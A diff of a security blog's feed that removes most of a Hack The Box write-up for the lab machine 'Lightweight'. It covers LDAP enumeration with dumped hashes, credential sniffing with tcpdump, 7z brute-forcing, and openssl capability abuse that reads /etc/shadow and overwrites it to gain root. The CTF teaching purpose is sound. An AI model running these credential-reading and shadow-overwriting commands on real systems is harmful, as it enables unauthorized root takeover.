-Nmap scan report for lightweight.htb (10.10.10.119)
-Host is up (0.17s latency).
-Not shown: 997 filtered ports
-PORT    STATE SERVICE
-22/tcp  open  ssh
-80/tcp  open  http
-389/tcp open  ldap
-| ldap-search: 
-|   Context: dc=lightweight,dc=htb
-|     dn: dc=lightweight,dc=htb
-|         objectClass: top
-|         objectClass: dcObject
-|         objectClass: organization
-|         o: lightweight htb
-|         dc: lightweight
-|     dn: cn=Manager,dc=lightweight,dc=htb
-|         objectClass: organizationalRole
-|         cn: Manager
-|         description: Directory Manager
-|     dn: ou=People,dc=lightweight,dc=htb
-|         objectClass: organizationalUnit
-|         ou: People
-|     dn: ou=Group,dc=lightweight,dc=htb
-|         objectClass: organizationalUnit
-|         ou: Group
-|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
-|         uid: ldapuser1
-|         cn: ldapuser1
-|         sn: ldapuser1
-|         mail: ldapuser1@lightweight.htb
-|         objectClass: person
-|         objectClass: organizationalPerson
-|         objectClass: inetOrgPerson
-|         objectClass: posixAccount
-|         objectClass: top
-|         objectClass: shadowAccount
-|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
-|         shadowLastChange: 17691
-|         shadowMin: 0
-|         shadowMax: 99999
-|         shadowWarning: 7
-|         loginShell: /bin/bash
-|         uidNumber: 1000
-|         gidNumber: 1000
-|         homeDirectory: /home/ldapuser1
-|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
-|         uid: ldapuser2
-|         cn: ldapuser2
-|         sn: ldapuser2
-|         mail: ldapuser2@lightweight.htb
-|         objectClass: person
-|         objectClass: organizationalPerson
-|         objectClass: inetOrgPerson
-|         objectClass: posixAccount
-|         objectClass: top
-|         objectClass: shadowAccount
-|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
-|         shadowLastChange: 17691
-|         shadowMin: 0
-|         shadowMax: 99999
-|         shadowWarning: 7
-|         loginShell: /bin/bash
-|         uidNumber: 1001
-|         gidNumber: 1001
-|         homeDirectory: /home/ldapuser2
-|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
-|         objectClass: posixGroup
-|         objectClass: top
-|         cn: ldapuser1
-|         userPassword: {crypt}x
-|         gidNumber: 1000
-|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
-|         objectClass: posixGroup
-|         objectClass: top
-|         cn: ldapuser2
-|         userPassword: {crypt}x
-|_        gidNumber: 1001
-
-# Nmap done at Fri May 10 17:11:03 2019 -- 1 IP address (1 host up) scanned in 17.35 seconds
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;if-we-take-a-look-at-ldapsearch-results-&quot;&gt;If we take a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; results :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/2.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-have-some-info-for-2-users--ldapuser1-and-ldapuser2-userpassword-is-a-base64-encoded-string-i-decoded-it-and-got-the-same-hashes-i-got-from-ldap-search-nmap-script-&quot;&gt;We have some info for 2 users : &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;userPassword&lt;/code&gt; is a base64 encoded string. I decoded it and got the same hashes I got from &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap-search&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; script :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;however-i-tried-to-crack-the-hashes-and-they-didnt-crack-lets-check-http&quot;&gt;However, I tried to crack the hashes and they didn’t crack. Let’s check http.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
-&lt;h4 id=&quot;usually-i-use-some-tools-for-web-like-gobuster-for-example-but-this-time-we-cant-do-that-because-we-will-get-blocked-as-you-can-see-&quot;&gt;Usually I use some tools for web like &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; for example, But this time We can’t do that because we will get blocked as you can see :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;also-the-info-page-is-saying-the-same-thing-&quot;&gt;Also the &lt;code class=&quot;highlighter-rouge&quot;&gt;info&lt;/code&gt; page is saying the same thing :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-its-also-saying-if-you-like-to-get-in-the-box-please-go-to-the-user-page-lets-check-user-&quot;&gt;And it’s also saying &lt;code class=&quot;highlighter-rouge&quot;&gt;If you like to get in the box, please go to the user page&lt;/code&gt;. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;so-we-can-login-with-ssh-with-the-ip-as-the-username-and-the-password-lets-try-&quot;&gt;So we can login with ssh with the ip as the username and the password. Let’s try :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;its-working-&quot;&gt;It’s working !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;tcpdump-capabilities-user-flag&quot;&gt;Tcpdump Capabilities, User Flag&lt;/h3&gt;
-&lt;h4 id=&quot;one-of-the-things-i-always-check-when-enumerating-linux-filesystem-is-the-binary-capabilities-so-i-used-getcap-on-some-directories-like-bin-usrbin-and-usrsbin-i-noticed-that-tcpdump-has-cap_net_admincap_net_rawep-capabilities&quot;&gt;One of the things I always check when enumerating linux filesystem is the binary capabilities. So I used &lt;code class=&quot;highlighter-rouge&quot;&gt;getcap&lt;/code&gt; on some directories like &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/sbin&lt;/code&gt;. I noticed that &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; has &lt;code class=&quot;highlighter-rouge&quot;&gt;cap_net_admin,cap_net_raw+ep&lt;/code&gt; capabilities.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;from-the-linux-capabilities-manual-i-found-some-info-about-these-capabilities-&quot;&gt;From the &lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;Linux Capabilities Manual&lt;/a&gt; I found some info about these capabilities :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;**CAP_NET_ADMIN**
-              Perform various network-related operations:
-              * interface configuration;
-              * administration of IP firewall, masquerading, and accounting;
-              * modify routing tables;
-              * bind to any address for transparent proxying;
-              * set type-of-service (TOS)
-              * clear driver statistics;
-              * set promiscuous mode;
-              * enabling multicasting;
-              * use [setsockopt(2)](http://man7.org/linux/man-pages/man2/setsockopt.2.html) to set the following socket options:
-                **SO_DEBUG**, **SO_MARK**, **SO_PRIORITY** (for a priority outside the
-                range 0 to 6), **SO_RCVBUFFORCE**, and **SO_SNDBUFFORCE**.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; **CAP_NET_RAW**
-              * Use RAW and PACKET sockets;
-              * bind to any address for transparent proxying.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;great-i-ran-tcpdump-on-all-the-interfaces-and-saved-the-output-to-capturedpcap-and-i-left-it-for-some-time-&quot;&gt;Great. I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; on all the interfaces and saved the output to &lt;code class=&quot;highlighter-rouge&quot;&gt;captured.pcap&lt;/code&gt; and I left it for some time :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump -i any -w captured.pcap&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-downloaded-the-pcap-on-my-box-to-open-it-with-wireshark-&quot;&gt;I downloaded the &lt;code class=&quot;highlighter-rouge&quot;&gt;pcap&lt;/code&gt; on my box to open it with &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;scp 10.10.xx.xx@lightweight.htb:/home/10.10.xx.xx/captured.pcap ./&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;in-wireshark-i-noticed-an-ldap-request-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt; I noticed an &lt;code class=&quot;highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; request :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-looked-at-it-and-found-that-its-an-authentication-request-&quot;&gt;I looked at it and found that it’s an authentication request :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-have-the-password-for-ldapuser2--8bc8251332abe1d7f105d3e53ad39ac2-lets-su-&quot;&gt;Now we have the password for &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt; :	&lt;code class=&quot;highlighter-rouge&quot;&gt;8bc8251332abe1d7f105d3e53ad39ac2&lt;/code&gt;. Lets &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/14.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;bruteforcing-7z-hardcoded-credentials-privilege-escalation-to-ldapuser1&quot;&gt;Bruteforcing &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt;, Hardcoded Credentials, Privilege Escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt;&lt;/h3&gt;
-&lt;h4 id=&quot;in-the-home-directory-of-ldapuser2-there-was-a-backup-file-called-backup7z-i-tried-to-extract-it-but-it-was-password-protected-&quot;&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt; there was a backup file called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.7z&lt;/code&gt;. I tried to extract it but it was password protected :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;so-i-transferred-it-to-my-box-to-bruteforce-it-nc-wasnt-installed-and-i-couldnt-use-scp-so-i-transferred-it-with-base64-encodingdecoding-&quot;&gt;So I transferred it to my box to bruteforce it (&lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; wasn’t installed and I couldn’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt; so I transferred it with base64 encoding/decoding) :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/17.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/18.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-used-this-tool-to-bruteforce-the-7z-file-&quot;&gt;I used &lt;a href=&quot;https://github.com/Seyptoo/7z-BruteForce&quot;&gt;this tool&lt;/a&gt; to bruteforce the &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt; file :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python 7z.py backup.7z /usr/share/wordlists/rockyou.txt&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;the-password-is-delete-after-extraction-we-have-some-php-files-looks-like-the-source-of-the-web-site-hosted-on-port-80-&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;delete&lt;/code&gt;. After extraction we have some &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files, Looks like the source of the web site hosted on port 80 :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-checked-them-all-and-in-statusphp-i-found-hardcoded-credentials-for-ldapuser1-&quot;&gt;I checked them all and in &lt;code class=&quot;highlighter-rouge&quot;&gt;status.php&lt;/code&gt; I found hardcoded credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-can-su-to-ldapuser1-with-the-password--f3ca9d298a553da117442deeb6fa932d-&quot;&gt;Now we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; with the password : &lt;code class=&quot;highlighter-rouge&quot;&gt;f3ca9d298a553da117442deeb6fa932d&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;openssl-capabilities-root-flag&quot;&gt;Openssl Capabilities, Root Flag&lt;/h3&gt;
-&lt;h4 id=&quot;i-looked-at-the-contents-of-homeldapuser1-and-i-noticed-some-stuff-a-php-file-called-ldaptlsphp-and-two-binaries--openssl-and-tcpdump&quot;&gt;I looked at the contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/ldapuser1&lt;/code&gt; and I noticed some stuff. A &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapTLS.php&lt;/code&gt; and two binaries : &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/24.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;cat ldapTLS.php&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;nothing-interesting-lets-check-the-binaries-we-dont-need-tcpdump-anymore-so-we-will-focus-on-openssl&quot;&gt;Nothing interesting. Lets check the binaries. (We don’t need &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; anymore so we will focus on &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt;)&lt;/h4&gt;
-&lt;h4 id=&quot;i-checked-the-capabilities-and-i-found-that-openssl-has-the-ep-capability-which-means-it-can-read-and-write-anything-on-the-filesystem&quot;&gt;I checked the capabilities and I found that &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; has the &lt;code class=&quot;highlighter-rouge&quot;&gt;ep&lt;/code&gt; capability which means it can read and write anything on the filesystem.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;this--means-that-we-can-simply-read-the-root-flag-by-using-the-base64-encoding-function-in-openssl-then-decoding-the-file-&quot;&gt;This  means that we can simply read the root flag by using the base64 encoding function in &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; then decoding the file :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -base64 -in /root/root.txt -out ./root.txt.b64&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d root.txt.b64&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-can-also-get-a-root-shell-by-overwriting-etcpasswd-or-etcshadow-i-got-a-copy-of-the-original-shadow-file-first-&quot;&gt;We can also get a root shell by overwriting &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt;. I got a copy of the original &lt;code class=&quot;highlighter-rouge&quot;&gt;shadow&lt;/code&gt; file first :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -base64 -in /etc/shadow -out ./shadow.b64&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d shadow.b64 &amp;gt; shadow&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-used-openssl-to-create-a-salted-password-i-used-root-as-the-salt-and-rick-as-the-password-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; to create a salted password. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; as the salt and &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt; as the password :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl passwd -1 -salt root rick&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-i-edited-the-copy-i-have-of-etcshadow-and-replaced-the-root-password-with-the-new-one-&quot;&gt;Then I edited the copy I have of &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; and replaced the root password with the new one :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-finally-i-used-openssl-to-replace-the-old-etcshadow-with-the-new-one-and-after-that-we-can-do-su-root-with-the-password-rick&quot;&gt;And finally I used &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; to replace the old &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; with the new one and after that we can do &lt;code class=&quot;highlighter-rouge&quot;&gt;su root&lt;/code&gt; with the password &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt;:&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -in shadow -out /etc/shadow&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---bighead&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bighead/&quot;&gt;Hack The Box - BigHead&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---conceal&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/conceal/&quot;&gt;Hack The Box - Conceal&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="ssh" /><category term="Binary Exploitation" /><category term="Networking" /><category term="Forensics" /><summary type="html">Quick Summary Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is 10.10.10.119, I added it to /etc/hosts as lightweight.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lightweight.htb 3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first. Ldap Enumeration To enumerate ldap I like to use a tool called ldapsearch, There’s also an nmap script called ldap-search that can do the same thing. ldapsearch : ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot; Full Output : ``` extended LDIF # LDAPv3 base &amp;lt;dc=lightweight,dc=htb&amp;gt; with scope subtree filter: (objectclass=*) requesting: ALL #</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/lightweight/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Networking" /><category term="ftp" /><category term="Web" /><category term="RCE" /><summary type="html">Quick Summary Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining IPSEC connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is 10.10.10.116, I added it to /etc/hosts as conceal.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services. nmap -sV -sT -sC conceal.htb And we got nothing ! I ran another nmap UDP scan on all ports : nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0 The output was too long so I will show the only important part : It was not sure about port 161, but it showed that port 500 is open. I ran a third scan on ports 500 and 161 : nmap -p 161,500 -sV -sU -sC conceal.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb Nmap scan report for conceal.htb (10.10.10.116) Host is up (0.20s latency).</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/conceal/0.png" /></entry></feed>
